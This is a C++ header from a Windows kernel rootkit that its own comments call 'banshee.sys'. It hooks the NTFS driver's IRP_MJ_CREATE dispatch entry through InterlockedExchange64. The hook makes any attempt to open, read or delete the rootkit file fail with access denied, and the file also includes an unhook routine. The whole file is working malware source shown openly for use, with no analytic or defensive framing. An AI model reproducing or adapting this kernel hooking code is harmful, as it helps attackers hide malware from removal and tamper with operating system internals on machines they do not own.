#pragma once

#include <ntifs.h>
#include <wdf.h>
#include <ntddk.h>
#include "Globals.hpp"
#include "WinTypes.hpp"

/**
 * Finds the filename from the given full path.
 *
 * @param fullPath Pointer to a wide character string representing the full path.
 * @return Pointer to the character following the last backslash in the path if found,
 *         otherwise returns the original pointer (assuming fullPath points to the filename).
 */
PWCH 
BeGetFilenameFromPath(PWCH fullPath) 
{
    // Find the last occurrence of backslash in the full path
    PWCH lastSlash = nullptr;
    PWCH current = fullPath;
    while (*current != L'\0') 
    {
        if (*current == L'\\') 
        {
            lastSlash = current;
        }
        current++;
    }

    // If a backslash is found, return the pointer to the character after the backslash
    if (lastSlash != nullptr) 
    {
        return lastSlash + 1;
    }
    else 
    {
        // Otherwise, return the original pointer (assuming fullPath points to the filename itself)
        return fullPath;
    }
}


/**
 * Retrieves the driver object of the NTFS driver.
 *
 * @param ntfsDriverObject Pointer to a variable to receive the pointer to the NTFS driver object.
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
{
    NTSTATUS status;
    UNICODE_STRING ntfsDriverName = RTL_CONSTANT_STRING(L"\\FileSystem\\NTFS");
    OBJECT_ATTRIBUTES objectAttributes;

    InitializeObjectAttributes(&objectAttributes, &ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Get a pointer to the driver object representing the NTFS driver
    status = BeGlobals::pObReferenceObjectByName(&ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)ntfsDriverObject);
    if (status != 0)
    {
        return status;
    }

    return STATUS_SUCCESS;
}

/**
 * Hooked IRP_MJ_CREATE handler for the NTFS driver.
 * Denies access to the file if the filename matches the rootkit driver filename "banshee.sys",
 * otherwise calls the original NTFS IRP_MJ_CREATE handler.
 *
 * @param DeviceObject Pointer to the target device object.
 * @param Irp Pointer to the I/O Request Packet (IRP).
 * @return STATUS_ACCESS_DENIED if access to the file is denied, otherwise returns the result of the original function.
 */
NTSTATUS 
BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);

    // Get filename of file that will be accessed
    PWCH fullPath = pIoStackIrp->FileObject->FileName.Buffer;

    // If the file that will be accessed is our rootkit driver, deny access to the file
    // This doesnt hide the file, but protects it from deletion or read access
    if (!BeIsStringNull(fullPath) &&
        (_strcmpi_w(L"banshee.sys", BeGetFilenameFromPath(fullPath)) == 0))
    {
        LOG_MSG("Filename: %ws\n", fullPath);
        Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
        return STATUS_SUCCESS;
    }

    // else call the original function
    return BeGlobals::originalNTFS_IRP_MJ_CREATE_function(DeviceObject, Irp);
}

/**
 * Hooks the IRP_MJ_CREATE function of the NTFS driver.
 *
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeHookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

	if (NtStatus != 0) 
    {
		LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
		return NtStatus;
	}

    // Get the MJ_CREATE function of the ntfs driver and save it to the global variable
    // Also put our function as the IRP_MJ_CREATE handler instead
    BeGlobals::originalNTFS_IRP_MJ_CREATE_function = (NTFS_IRP_MJ_CREATE_FUNCTION)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeHooked_NTFS_IRP_MJ_CREATE);

	ObDereferenceObject(ntfsDriverObject);
	return STATUS_SUCCESS;
}

/**
 * Unhooks the IRP_MJ_CREATE function of the NTFS driver.
 *
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeUnhookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

    if (NtStatus != 0)
    {
        LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
        return NtStatus;
    }

    // Restore the original address
    InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeGlobals::originalNTFS_IRP_MJ_CREATE_function);

    ObDereferenceObject(ntfsDriverObject);
    return STATUS_SUCCESS;
}